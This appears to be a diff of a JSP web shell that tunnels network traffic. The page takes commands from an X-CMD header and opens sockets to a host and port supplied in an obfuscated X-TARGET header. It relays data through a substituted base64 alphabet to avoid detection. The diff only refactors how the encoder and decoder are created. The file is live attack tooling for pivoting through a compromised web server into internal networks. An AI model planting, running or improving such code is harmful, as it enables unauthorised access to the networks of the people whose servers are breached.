@@ -1,14 +1,16 @@
-<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket" %>
+<%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket"%>
 <%
 	String cmd = request.getHeader("X-CMD");
 	char[] en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();
 	char[] de = "BASE64 CHARSLIST".toCharArray();
+	sun.misc.BASE64Encoder en64 = new sun.misc.BASE64Encoder();
+	sun.misc.BASE64Decoder de64 = new sun.misc.BASE64Decoder();
 	if (cmd != null) {
 		response.setHeader("X-STATUS", "OK");
 		if (cmd.compareTo("CONNECT") == 0) {
 			try {
 				String data = StrTr(request.getHeader("X-TARGET"), de, en);
-				String[] target_ary = new String(new sun.misc.BASE64Decoder().decodeBuffer(data)).split("\\|");
+				String[] target_ary = new String(de64.decodeBuffer(data)).split("\\|");
 				String target = target_ary[0];
 				int port = Integer.parseInt(target_ary[1]);
 				SocketChannel socketChannel = SocketChannel.open();
@@ -43,7 +45,7 @@
 				while (bytesRead > 0){
 					byte[] data = new byte[bytesRead];
 					System.arraycopy(buf.array(), 0, data, 0, bytesRead);
-					byte[] base64 = StrTr(new sun.misc.BASE64Encoder().encode(data), en, de).getBytes();
+					byte[] base64 = StrTr(en64.encode(data), en, de).getBytes();
 					so.write(base64, 0, base64.length);
 					so.flush();
 					buf.clear();
@@ -68,7 +70,7 @@
 
 				request.getInputStream().read(buff, 0, readlen);
 				String data = StrTr(new String(buff), de, en);
-				byte[] base64 = new sun.misc.BASE64Decoder().decodeBuffer(data);
+				byte[] base64 = de64.decodeBuffer(data);
 				ByteBuffer buf = ByteBuffer.allocate(base64.length);
 				buf.clear();
 				buf.put(base64);
